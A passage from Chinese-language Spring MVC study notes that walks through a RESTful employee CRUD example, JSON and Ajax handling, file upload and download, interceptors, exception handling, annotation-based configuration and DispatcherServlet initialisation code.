过滤器就会将当前请求的请求方式转换为请求参数_method的值，因此请求参数_method的值才是最终的请求方式\n\n在web.xml中注册HiddenHttpMethodFilter\n\n<filter>\n    <filter-name>HiddenHttpMethodFilter</filter-name>\n    <filter-class>org.springframework.web.filter.HiddenHttpMethodFilter</filter-class>\n</filter>\n<filter-mapping>\n    <filter-name>HiddenHttpMethodFilter</filter-name>\n    <url-pattern>/*</url-pattern>\n</filter-mapping>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n> 注： 目前为止，SpringMVC中提供了两个过滤器：CharacterEncodingFilter和HiddenHttpMethodFilter 在web.xml中注册时，必须先注册CharacterEncodingFilter，再注册HiddenHttpMethodFilter 原因：\n> \n>  1. 在 CharacterEncodingFilter 中通过 request.setCharacterEncoding(encoding) 方法设置字符集的\n>  2. request.setCharacterEncoding(encoding) 方法要求前面不能有任何获取请求参数的操作\n>  3. 而 HiddenHttpMethodFilter 恰恰有一个获取请求方式的操作：String paramValue = request.getParameter(this.methodParam);\n\n\n# RESTful案例\n\n# 准备工作\n\n 1. 实体类\n\npublic class Employee {\n\nprivate Integer id; private String lastName;\n\nprivate String email; //1 male, 0 female private Integer gender;\n\npublic Integer getId() { return id; }\n\npublic void setId(Integer id) { this.id = id; }\n\npublic String getLastName() { return lastName; }\n\npublic void setLastName(String lastName) { this.lastName = lastName; }\n\npublic String getEmail() { return email; }\n\npublic void setEmail(String email) { this.email = email; }\n\npublic Integer getGender() { return gender; }\n\npublic void setGender(Integer gender) { this.gender = gender; }\n\npublic Employee(Integer id, String lastName, String email, Integer gender) { super(); this.id = id; this.lastName = lastName; this.email = email; this.gender = gender; }\n\npublic Employee() { } }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n 2. Dao层模拟数据\n\npackage com.atguigu.mvc.dao;\n\nimport java.util.Collection;\nimport java.util.HashMap;\nimport java.util.Map;\n\nimport com.atguigu.mvc.bean.Employee;\nimport org.springframework.stereotype.Repository;\n\n\n\n@Repository public class EmployeeDao {\n\n\nprivate static Map<Integer, Employee> employees = null;\n\nstatic{\nemployees = new HashMap<Integer, Employee>();\n\nemployees.put(1001, new Employee(1001, "E-AA", "aa@163.com", 1));\nemployees.put(1002, new Employee(1002, "E-BB", "bb@163.com", 1));\nemployees.put(1003, new Employee(1003, "E-CC", "cc@163.com", 0));\nemployees.put(1004, new Employee(1004, "E-DD", "dd@163.com", 0));\nemployees.put(1005, new Employee(1005, "E-EE", "ee@163.com", 1));\n}\n\nprivate static Integer initId = 1006;\n\npublic void save(Employee employee){\nif(employee.getId() == null){\nemployee.setId(initId++);\n}\nemployees.put(employee.getId(), employee);\n}\n\npublic Collection<Employee> getAll(){\nreturn employees.values();\n}\n\npublic Employee get(Integer id){\nreturn employees.get(id);\n}\n\npublic void delete(Integer id){\nemployees.remove(id);\n}\n\n}\t\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n\n\n# 对应功能列表\n\n功能           URL 地址        请求方式\n访问首页√        /             GET\n查询全部数据√      /employee     GET\n删除√          /employee/2   DELETE\n跳转到添加数据页面√   /toAdd        GET\n执行保存√        /employee     POST\n跳转到更新数据页面√   /employee/2   GET\n执行更新√        /employee     PUT\n\n# 访问首页功能\n\n 1. 创建页面\n\n<!DOCTYPE html>  \n<html lang="en" xmlns:th="http://www.thymeleaf.org">  \n<head>  \n <meta charset="UTF-8" >  \n <title>Title</title>  \n</head>  \n<body>  \n<h1>首页</h1>  \n<a th:href="@{/employee}">访问员工信息</a>  \n</body>  \n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n 2. 配置view-controller\n\n<mvc:view-controller path="/" view-name="index"/>\n\n\n1\n\n\n# 查询所有员工信息功能\n\n 1. 创建页面\n\n<!DOCTYPE html>\n<html lang="en" xmlns:th="http://www.thymeleaf.org">\n<head>\n    <meta charset="UTF-8">\n    <title>Employee Info</title>\n    <script type="text/javascript" th:src="@{/static/js/vue.js}"><\/script>\n</head>\n<body>\n\n    <table border="1" cellpadding="0" cellspacing="0" style="text-align: center;" id="dataTable">\n        <tr>\n            <th colspan="5">Employee Info</th>\n        </tr>\n        <tr>\n            <th>id</th>\n            <th>lastName</th>\n            <th>email</th>\n            <th>gender</th>\n            <th>options(<a th:href="@{/toAdd}">add</a>)</th>\n        </tr>\n        <tr th:each="employee : ${employeeList}">\n            <td th:text="${employee.id}"></td>\n            <td th:text="${employee.lastName}"></td>\n            <td th:text="${employee.email}"></td>\n            <td th:text="${employee.gender}"></td>\n            <td>\n                <a class="deleteA" @click="deleteEmployee" th:href="@{\'/employee/\'+${employee.id}}">delete</a>\n                <a th:href="@{\'/employee/\'+${employee.id}}">update</a>\n            </td>\n        </tr>\n    </table>\n</body>\n</html>\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n\n 2. 创建Controller处理请求方法\n\npackage com.pwddd.emp.controller;  \n  \nimport com.pwddd.emp.dao.EmployeeDao;  \nimport com.pwddd.emp.entity.Employee;  \nimport org.springframework.beans.factory.annotation.Autowired;  \nimport org.springframework.stereotype.Controller;  \nimport org.springframework.ui.Model;  \nimport org.springframework.web.bind.annotation.RequestMapping;  \nimport org.springframework.web.bind.annotation.RequestMethod;  \n  \nimport java.util.Collection;  \n  \n@Controller  \npublic class EmployeeController {  \n  \n @Autowired  \n private EmployeeDao employeeDao;  \n  \n @RequestMapping(value = "/employee", method = RequestMethod.GET)  \n public String getEmployeeList(Model model){  \n Collection<Employee> employeeList = employeeDao.getAll();  \n model.addAttribute("employeeList", employeeList);  \n return "employee_list";  \n }  \n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n\n\n# 删除功能\n\n删除功能稍微麻烦，不能使用form表单进行操作，但是需要设置一个隐藏的_method属性，因此可以使用VUE的将a标签触发绑定到一个form表单提交之上，然后在表单里面添加属性。\n\n 1. 创建处理delete请求方式的表单\n\n\x3c!-- 作用：通过超链接控制表单的提交，将post请求转换为delete请求 --\x3e\n<form id="delete_form" method="post">\n    \x3c!-- HiddenHttpMethodFilter要求：必须传输_method请求参数，并且值为最终的请求方式 --\x3e\n    <input type="hidden" name="_method" value="delete"/>\n</form>\n\n\n\n1\n2\n3\n4\n5\n6\n\n 2. 删除超链接绑定点击事件\n\n\x3c!--引入vue--\x3e\n<script type="text/javascript" th:src="@{/static/js/vue.js}"><\/script>\n\n\x3c!--绑定表单--\x3e\n<a class="deleteA" @click="deleteEmployee" th:href="@{\'/employee/\'+${employee.id}}">delete</a>\n\n\x3c!--通过vue处理点击事件--\x3e\n<script type="text/javascript">\n    var vue = new Vue({\n        el:"#dataTable",\n        methods:{\n            //event表示当前事件\n            deleteEmployee:function (event) {\n                //通过id获取表单标签\n                var delete_form = document.getElementById("delete_form");\n                //将触发事件的超链接的href属性为表单的action属性赋值\n                delete_form.action = event.target.href;\n                //提交表单\n                delete_form.submit();\n                //阻止超链接的默认跳转行为\n                event.preventDefault();\n            }\n        }\n    });\n<\/script>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n 3. 创建服务端的方法\n\n@RequestMapping(value = "/employee/{id}", method = RequestMethod.DELETE)\npublic String deleteEmployee(@PathVariable("id") Integer id){\n    employeeDao.delete(id);\n    return "redirect:/employee";\n}\n\n\n\n1\n2\n3\n4\n5\n6\n\n 4. Spring-mvc.xml配置文件开启静态资源的默认servlet处理\n\n<mvc:default-servlet-handler default-servlet-name="default" />\n\n\n1\n\n\n在默认情况下，存在一个defalutservlet处理我们的请求，但是我们在web.xml中配置的DispatchServlet的url-partten和默认的一样，所以进行了覆盖，也就是客户端的所有请求都会找到dispatchServlet进行处理，包括静态资源，但是DispatchServlet不知道静态资源在哪。开启默认的serlvet处理静态资源，当dispatchServlet找不到请求的内容时，交给默认Servlet处理，默认的Servlet找不到，则404报错。\n\n# 数据新增\n\n 1. 配置view-controller\n\n<mvc:view-controller path="/toAdd" view-name="employee_add"></mvc:view-controller>\n\n\n1\n\n 2. 创建页面\n\n<!DOCTYPE html>\n<html lang="en" xmlns:th="http://www.thymeleaf.org">\n<head>\n    <meta charset="UTF-8">\n    <title>Add Employee</title>\n</head>\n<body>\n\n<form th:action="@{/employee}" method="post">\n    lastName:<input type="text" name="lastName"><br>\n    email:<input type="text" name="email"><br>\n    gender:<input type="radio" name="gender" value="1">male\n    <input type="radio" name="gender" value="0">female<br>\n    <input type="submit" value="add"><br>\n</form>\n\n</body>\n</html>\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n 3. 新增服务端方法\n\n@RequestMapping(value = "/employee", method = RequestMethod.POST)\npublic String addEmployee(Employee employee){\n    employeeDao.save(employee);\n    return "redirect:/employee";\n}\n\n\n1\n2\n3\n4\n5\n\n\n# 数据修改\n\n 1. 创建数据修改页面\n\n<!DOCTYPE html>\n<html lang="en" xmlns:th="http://www.thymeleaf.org">\n<head>\n    <meta charset="UTF-8">\n    <title>Update Employee</title>\n</head>\n<body>\n\n<form th:action="@{/employee}" method="post">\n    <input type="hidden" name="_method" value="put">\n    <input type="hidden" name="id" th:value="${employee.id}">\n    lastName:<input type="text" name="lastName" th:value="${employee.lastName}"><br>\n    email:<input type="text" name="email" th:value="${employee.email}"><br>\n    \x3c!--\n        th:field="${employee.gender}"可用于单选框或复选框的回显\n        若单选框的value和employee.gender的值一致，则添加checked="checked"属性\n    --\x3e\n    gender:<input type="radio" name="gender" value="1" th:field="${employee.gender}">male\n    <input type="radio" name="gender" value="0" th:field="${employee.gender}">female<br>\n    <input type="submit" value="update"><br>\n</form>\n\n</body>\n</html>\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n 2. 服务端配置数据修改页面回显和跳转链接\n\n@RequestMapping(value = "/employee/{id}", method = RequestMethod.GET)\npublic String getEmployeeById(@PathVariable("id") Integer id, Model model){\n    Employee employee = employeeDao.get(id);\n    model.addAttribute("employee", employee);\n    return "employee_update";\n}\n\n\n1\n2\n3\n4\n5\n6\n\n 3. 服务端配置修改操作方法\n\n@RequestMapping(value = "/employee", method = RequestMethod.PUT)\npublic String updateEmployee(Employee employee){\n    employeeDao.save(employee);\n    return "redirect:/employee";\n}\n\n\n1\n2\n3\n4\n5\n\n\n\n# HttpMessageConverter\n\nHttpMessageConverter，报文信息转换器，将请求报文转换为Java对象，或将Java对象转换为响应报文。 HttpMessageConverter提供了两个注解和两个类型：\n\n * @RequestBody\n * @ResponseBody\n * RequestEntity\n * ResponseEntity\n\n\n# @RequestBody\n\n@RequestBody可以获取请求体，需要在控制器方法设置一个形参，使用@RequestBody进行标识，当前请求的请求体就会为当前注解所标识的形参赋值\n\n<form th:action="@{/testRequestBody}" method="post">\n    用户名：<input type="text" name="username"><br>\n    密码：<input type="password" name="password"><br>\n    <input type="submit">\n</form>\n\n\n1\n2\n3\n4\n5\n\n\n@RequestMapping("/testRequestBody")\npublic String testRequestBody(@RequestBody String requestBody){\n    System.out.println("requestBody:"+requestBody);\n    return "success";\n}\n\n\n1\n2\n3\n4\n5\n\n\nrequestBody:username=admin&amp;password=123456\n\n\n1\n\n\n\n# RequestEntity\n\nRequestEntity封装请求报文的一种类型，需要在控制器方法的形参中设置该类型的形参，当前请求的请求报文就会赋值给该形参，可以通过getHeaders()获取请求头信息，通过getBody()获取请求体信息\n\n@RequestMapping("/testRequestEntity")\npublic String testRequestEntity(RequestEntity<String> requestEntity){\n    System.out.println("requestHeader:"+requestEntity.getHeaders());\n    System.out.println("requestBody:"+requestEntity.getBody());\n    return "success";\n}\n\n\n1\n2\n3\n4\n5\n6\n\n\n输出结果： requestHeader:[host:"localhost:8080", connection:"keep-alive", content-length:"27", cache-control:"max-age=0", sec-ch-ua:"" Not A;Brand";v="99", "Chromium";v="90", "Google Chrome";v="90"", sec-ch-ua-mobile:"?0", upgrade-insecure-requests:"1", origin:"[http://localhost:8080"](http://localhost:8080"), user-agent:"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36"] requestBody:username=admin&amp;password=123\n\n\n1\n\n\n\n# @ResponseBody\n\n@ResponseBody用于标识一个控制器方法，可以将该方法的返回值直接作为响应报文的响应体响应到浏览器。\n\n@RequestMapping("/testResponseBody")\n@ResponseBody\npublic String testResponseBody(){\n    return "success";\n}\n\n\n1\n2\n3\n4\n5\n\n\n\n# SpringMVC处理json\n\n 1. 导入Jackjson依赖\n\n<dependency>\n    <groupId>com.fasterxml.jackson.core</groupId>\n    <artifactId>jackson-databind</artifactId>\n    <version>2.12.1</version>\n</dependency>\n\n\n1\n2\n3\n4\n5\n\n 2. 在SpringMVC的核心配置文件中开启mvc的注解驱动，此时在HandlerAdaptor中会自动装配一个消息转换器：MappingJackson2HttpMessageConverter，可以将响应到浏览器的Java对象转换为Json格式的字符串\n\n<mvc:annotation-driven />\n\n\n1\n\n\n 3. 在处理器方法上使用@ResponseBody注解进行标识\n\n 4. 将Java对象直接作为控制器方法的返回值返回，就会自动转换为Json格式的字符串\n\n@RequestMapping("/testResponseUser")\n@ResponseBody\npublic User testResponseUser(){\n    return new User(1001,"admin","123456",23,"男");\n}\n\n\n1\n2\n3\n4\n5\n\n\n\n# SpringMVC处理ajax\n\n 1. 请求地址超链接\n\n<div id="app">\n    <a th:href="@{/testAjax}" @click="testAjax">testAjax</a><br>\n</div>\n\n\n1\n2\n3\n\n 2. 通过vue和axios处理点击事件\n\n<script type="text/javascript" th:src="@{/static/js/vue.js}"><\/script>\n<script type="text/javascript" th:src="@{/static/js/axios.min.js}"><\/script>\n<script type="text/javascript">\n    var vue = new Vue({\n        el:"#app",\n        methods:{\n            testAjax:function (event) {\n                axios({\n                    method:"post",\n                    url:event.target.href,\n                    params:{\n                        username:"admin",\n                        password:"123456"\n                    }\n                }).then(function (response) {\n                    alert(response.data);\n                });\n                event.preventDefault();\n            }\n        }\n    });\n<\/script>\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n 3. 编写控制器方法\n\n@RequestMapping("/testAjax")\n@ResponseBody\npublic String testAjax(String username, String password){\n    System.out.println("username:"+username+",password:"+password);\n    return "hello,ajax";\n}\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# @RestController注解\n\n@RestController注解是springMVC提供的一个复合注解，标识在控制器的类上，就相当于为类添加了@Controller注解，并且为其中的每个方法添加了@ResponseBody注解\n\n\n# ResponseEntity\n\nResponseEntity用于控制器方法的返回值类型，该控制器方法的返回值就是响应到浏览器的响应报文。\n\n\n# 文件上传和下载\n\n\n# 文件下载功能\n\n@RequestMapping("/testDown")\npublic ResponseEntity<byte[]> testResponseEntity(HttpSession session) throws IOException {\n    //获取ServletContext对象\n    ServletContext servletContext = session.getServletContext();\n    //获取服务器中文件的真实路径\n    String realPath = servletContext.getRealPath("/static/img/1.jpg");\n    //创建输入流\n    InputStream is = new FileInputStream(realPath);\n    //创建字节数组\n    byte[] bytes = new byte[is.available()];\n    //将流读到字节数组中\n    is.read(bytes);\n    //创建HttpHeaders对象设置响应头信息\n    MultiValueMap<String, String> headers = new HttpHeaders();\n    //设置要下载方式以及下载文件的名字\n    headers.add("Content-Disposition", "attachment;filename=1.jpg");\n    //设置响应状态码\n    HttpStatus statusCode = HttpStatus.OK;\n    //创建ResponseEntity对象\n    ResponseEntity<byte[]> responseEntity = new ResponseEntity<>(bytes, headers, statusCode);\n    //关闭输入流\n    is.close();\n    return responseEntity;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\n\n\n# 文件上传功能\n\n文件上传要求form表单的请求方式必须为post，并且添加属性enctype="multipart/form-data" SpringMVC中将上传的文件封装到MultipartFile对象中，通过此对象可以获取文件相关信息\n\n上传步骤：\n\n 1. 添加依赖\n\n\x3c!-- https://mvnrepository.com/artifact/commons-fileupload/commons-fileupload --\x3e\n<dependency>\n    <groupId>commons-fileupload</groupId>\n    <artifactId>commons-fileupload</artifactId>\n    <version>1.3.1</version>\n</dependency>\n\n\n1\n2\n3\n4\n5\n6\n\n 2. 在SpringMVC的配置文件中添加配置\n\n\x3c!--必须通过文件解析器的解析才能将文件转换为MultipartFile对象--\x3e\n<bean id="multipartResolver" class="org.springframework.web.multipart.commons.CommonsMultipartResolver"></bean>\n\n\n1\n2\n\n 3. 配置控制器方法\n\n@RequestMapping("/testUp")\npublic String testUp(MultipartFile photo, HttpSession session) throws IOException {\n    //获取上传的文件的文件名\n    String fileName = photo.getOriginalFilename();\n    //处理文件重名问题\n    String hzName = fileName.substring(fileName.lastIndexOf("."));\n    fileName = UUID.randomUUID().toString() + hzName;\n    //获取服务器中photo目录的路径\n    ServletContext servletContext = session.getServletContext();\n    String photoPath = servletContext.getRealPath("photo");\n    File file = new File(photoPath);\n    if(!file.exists()){\n        file.mkdir();\n    }\n    String finalPath = photoPath + File.separator + fileName;\n    //实现上传功能\n    photo.transferTo(new File(finalPath));\n    return "success";\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n\n# 拦截器\n\n\n# 拦截器的配置\n\nSpringMVC中的拦截器用于拦截控制器方法的执行 SpringMVC中的拦截器需要实现HandlerInterceptor SpringMVC的拦截器必须在SpringMVC的配置文件中进行配置：\n\n<bean class="com.atguigu.interceptor.FirstInterceptor"></bean>\n<ref bean="firstInterceptor"></ref>\n\x3c!-- 以上两种配置方式都是对DispatcherServlet所处理的所有的请求进行拦截 --\x3e\n<mvc:interceptor>\n    <mvc:mapping path="/**"/>\n    <mvc:exclude-mapping path="/testRequestEntity"/>\n    <ref bean="firstInterceptor"></ref>\n</mvc:interceptor>\n\x3c!-- \n    以上配置方式可以通过ref或bean标签设置拦截器，通过mvc:mapping设置需要拦截的请求，通过mvc:exclude-mapping设置需要排除的请求，即不需要拦截的请求\n--\x3e\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n\n# 拦截器的三个处理方法\n\nSpringMVC中的拦截器有三个抽象方法： preHandle：控制器方法执行之前执行preHandle()，其boolean类型的返回值表示是否拦截或放行，返回true为放行，即调用控制器方法；返回false表示拦截，即不调用控制器方法 postHandle：控制器方法执行之后执行postHandle() afterComplation：处理完视图和模型数据，渲染视图完毕之后执行afterComplation()\n\n\n# 多个拦截器的执行顺序\n\n * 若每个拦截器的preHandle()都返回true\n   * 此时多个拦截器的执行顺序和拦截器在SpringMVC的配置文件的配置顺序有关\n   * preHandle()会按照配置的顺序执行，而postHandle()和afterComplation()会按照配置的反序执行\n * 若某个拦截器的preHandle()返回了false\n   * preHandle()返回false和它之前的拦截器的preHandle()都会执行，postHandle()都不执行，返回false的拦截器之前的拦截器的afterComplation()会执行\n\n\n# 异常处理器\n\n\n# 基于配置的异常处理\n\nSpringMVC提供了一个处理控制器方法执行过程中所出现的异常的接口：HandlerExceptionResolver HandlerExceptionResolver接口的实现类有：DefaultHandlerExceptionResolver和SimpleMappingExceptionResolver SpringMVC提供了自定义的异常处理器SimpleMappingExceptionResolver。\n\n<bean class="org.springframework.web.servlet.handler.SimpleMappingExceptionResolver">\n    <property name="exceptionMappings">\n        <props>\n            \x3c!--\n                properties的键表示处理器方法执行过程中出现的异常\n                properties的值表示若出现指定异常时，设置一个新的视图名称，跳转到指定页面\n            --\x3e\n            <prop key="java.lang.ArithmeticException">error</prop>\n        </props>\n    </property>\n    \x3c!--\n        exceptionAttribute属性设置一个属性名，将出现的异常信息在请求域中进行共享\n    --\x3e\n    <property name="exceptionAttribute" value="ex"></property>\n</bean>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n\n# 基于注解的异常处理\n\n//@ControllerAdvice将当前类标识为异常处理的组件\n@ControllerAdvice\npublic class ExceptionController {\n\n    //@ExceptionHandler用于设置所标识方法处理的异常\n    @ExceptionHandler(ArithmeticException.class)\n    //ex表示当前请求处理中出现的异常对象\n    public String handleArithmeticException(Exception ex, Model model){\n        model.addAttribute("ex", ex);\n        return "error";\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n\n# 注解配置SpringMVC\n\n> 使用配置类和注解代替web.xml和SpringMVC配置文件的功能\n\n 1. 创建初始化类，代替web.xml\n\n在Servlet3.0环境中，容器会在类路径中查找实现javax.servlet.ServletContainerInitializer接口的类，如果找到的话就用它来配置Servlet容器。 Spring提供了这个接口的实现，名为SpringServletContainerInitializer，这个类反过来又会查找实现WebApplicationInitializer的类并将配置的任务交给它们来完成。Spring3.2引入了一个便利的WebApplicationInitializer基础实现，名为AbstractAnnotationConfigDispatcherServletInitializer，当我们的类扩展了AbstractAnnotationConfigDispatcherServletInitializer并将其部署到Servlet3.0容器的时候，容器会自动发现它，并用它来配置Servlet上下文。\n\npublic class WebInit extends AbstractAnnotationConfigDispatcherServletInitializer {\n\n    /**\n     * 指定spring的配置类\n     * @return\n     */\n    @Override\n    protected Class<?>[] getRootConfigClasses() {\n        return new Class[]{SpringConfig.class};\n    }\n\n    /**\n     * 指定SpringMVC的配置类\n     * @return\n     */\n    @Override\n    protected Class<?>[] getServletConfigClasses() {\n        return new Class[]{WebConfig.class};\n    }\n\n    /**\n     * 指定DispatcherServlet的映射规则，即url-pattern\n     * @return\n     */\n    @Override\n    protected String[] getServletMappings() {\n        return new String[]{"/"};\n    }\n\n    /**\n     * 添加过滤器\n     * @return\n     */\n    @Override\n    protected Filter[] getServletFilters() {\n        CharacterEncodingFilter encodingFilter = new CharacterEncodingFilter();\n        encodingFilter.setEncoding("UTF-8");\n        encodingFilter.setForceRequestEncoding(true);\n        HiddenHttpMethodFilter hiddenHttpMethodFilter = new HiddenHttpMethodFilter();\n        return new Filter[]{encodingFilter, hiddenHttpMethodFilter};\n    }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n\n 2. 创建SpringConfig配置类，代替spring的配置文件\n\n@Configuration\npublic class SpringConfig {\n    //ssm整合之后，spring的配置信息写在此类中\n}\n\n\n1\n2\n3\n4\n\n 3. 创建WebConfig配置类，代替SpringMVC的配置文件\n\n@Configuration\n//扫描组件\n@ComponentScan("com.atguigu.mvc.controller")\n//开启MVC注解驱动\n@EnableWebMvc\npublic class WebConfig implements WebMvcConfigurer {\n\n    //使用默认的servlet处理静态资源\n    @Override\n    public void configureDefaultServletHandling(DefaultServletHandlerConfigurer configurer) {\n        configurer.enable();\n    }\n\n    //配置文件上传解析器\n    @Bean\n    public CommonsMultipartResolver multipartResolver(){\n        return new CommonsMultipartResolver();\n    }\n\n    //配置拦截器\n    @Override\n    public void addInterceptors(InterceptorRegistry registry) {\n        FirstInterceptor firstInterceptor = new FirstInterceptor();\n        registry.addInterceptor(firstInterceptor).addPathPatterns("/**");\n    }\n\n    //配置视图控制\n\n    /*@Override\n    public void addViewControllers(ViewControllerRegistry registry) {\n        registry.addViewController("/").setViewName("index");\n    }*/\n\n    //配置异常映射\n    /*@Override\n    public void configureHandlerExceptionResolvers(List<HandlerExceptionResolver> resolvers) {\n        SimpleMappingExceptionResolver exceptionResolver = new SimpleMappingExceptionResolver();\n        Properties prop = new Properties();\n        prop.setProperty("java.lang.ArithmeticException", "error");\n        //设置异常映射\n        exceptionResolver.setExceptionMappings(prop);\n        //设置共享异常信息的键\n        exceptionResolver.setExceptionAttribute("ex");\n        resolvers.add(exceptionResolver);\n    }*/\n\n    //配置生成模板解析器\n    @Bean\n    public ITemplateResolver templateResolver() {\n        WebApplicationContext webApplicationContext = ContextLoader.getCurrentWebApplicationContext();\n        // ServletContextTemplateResolver需要一个ServletContext作为构造参数，可通过WebApplicationContext 的方法获得\n        ServletContextTemplateResolver templateResolver = new ServletContextTemplateResolver(\n                webApplicationContext.getServletContext());\n        templateResolver.setPrefix("/WEB-INF/templates/");\n        templateResolver.setSuffix(".html");\n        templateResolver.setCharacterEncoding("UTF-8");\n        templateResolver.setTemplateMode(TemplateMode.HTML);\n        return templateResolver;\n    }\n\n    //生成模板引擎并为模板引擎注入模板解析器\n    @Bean\n    public SpringTemplateEngine templateEngine(ITemplateResolver templateResolver) {\n        SpringTemplateEngine templateEngine = new SpringTemplateEngine();\n        templateEngine.setTemplateResolver(templateResolver);\n        return templateEngine;\n    }\n\n    //生成视图解析器并未解析器注入模板引擎\n    @Bean\n    public ViewResolver viewResolver(SpringTemplateEngine templateEngine) {\n        ThymeleafViewResolver viewResolver = new ThymeleafViewResolver();\n        viewResolver.setCharacterEncoding("UTF-8");\n        viewResolver.setTemplateEngine(templateEngine);\n        return viewResolver;\n    }\n\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n\n\n\n# SpringMVC执行流程\n\n\n# SpringMVC常用组件\n\nDispatcherServlet：前端控制器，不需要工程师开发，由框架提供 作用：统一处理请求和响应，整个流程控制的中心，由它调用其它组件处理用户的请求 HandlerMapping：处理器映射器，不需要工程师开发，由框架提供 作用：根据请求的url、method等信息查找Handler，即控制器方法 Handler：处理器，需要工程师开发 作用：在DispatcherServlet的控制下Handler对具体的用户请求进行处理 HandlerAdapter：处理器适配器，不需要工程师开发，由框架提供 作用：通过HandlerAdapter对处理器（控制器方法）进行执行 ViewResolver：视图解析器，不需要工程师开发，由框架提供 作用：进行视图解析，得到相应的视图，例如：ThymeleafView、InternalResourceView、RedirectView View：视图 作用：将模型数据通过页面展示给用户\n\n\n# DispatcherServlet初始化过程\n\nDispatcherServlet 本质上是一个 Servlet，所以天然的遵循 Servlet 的生命周期。所以宏观上是 Servlet 生命周期来进行调度。\n\n\n\n\n# 初始化WebApplicationContext\n\n所在类：org.springframework.web.servlet.FrameworkServlet\n\nprotected WebApplicationContext initWebApplicationContext() {\n    WebApplicationContext rootContext =\n        WebApplicationContextUtils.getWebApplicationContext(getServletContext());\n    WebApplicationContext wac = null;\n\n    if (this.webApplicationContext != null) {\n        // A context instance was injected at construction time -> use it\n        wac = this.webApplicationContext;\n        if (wac instanceof ConfigurableWebApplicationContext) {\n            ConfigurableWebApplicationContext cwac = (ConfigurableWebApplicationContext) wac;\n            if (!cwac.isActive()) {\n                // The context has not yet been refreshed -> provide services such as\n                // setting the parent context, setting the application context id, etc\n                if (cwac.getParent() == null) {\n                    // The context instance was injected without an explicit parent -> set\n                    // the root application context (if any; may be null) as the parent\n                    cwac.setParent(rootContext);\n                }\n                configureAndRefreshWebApplicationContext(cwac);\n            }\n        }\n    }\n    if (wac == null) {\n        // No context instance was injected at construction time -> see if one\n        // has been registered in the servlet context. If one exists, it is assumed\n        // that the parent context (if any) has already been set and that the\n        // user has performed any initialization such as setting the context id\n        wac = findWebApplicationContext();\n    }\n    if (wac == null) {\n        // No context instance is defined for this servlet -> create a local one\n        // 创建WebApplicationContext\n        wac = createWebApplicationContext(rootContext);\n    }\n\n    if (!this.refreshEventReceived) {\n        // Either the context is not a ConfigurableApplicationContext with refresh\n        // support or the context injected at construction time had already been\n        // refreshed -> trigger initial onRefresh manually here.\n        synchronized (this.onRefreshMonitor) {\n            // 刷新WebApplicationContext\n            onRefresh(wac);\n        }\n    }\n\n    if (this.publishContext) {\n        // Publish the context as a servlet context attribute.\n        // 将IOC容器在应用域共享\n        String attrName = getServletContextAttributeName();\n        getServletContext().setAttribute(attrName, wac);\n    }\n\n    return wac;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n\n\n\n# 创建WebApplicationContext\n\n所在类：org.springframework.web.servlet.FrameworkServlet\n\nprotected WebApplicationContext createWebApplicationContext(@Nullable ApplicationContext parent) {\n    Class<?> contextClass = getContextClass();\n    if (!ConfigurableWebApplicationContext.class.isAssignableFrom(contextClass)) {\n        throw new ApplicationContextException(\n            "Fatal initialization error in servlet with name \'" + getServletName() +\n            "\': custom WebApplicationContext class [" + contextClass.getName() +\n            "] is not of type ConfigurableWebApplicationContext");\n    }\n    // 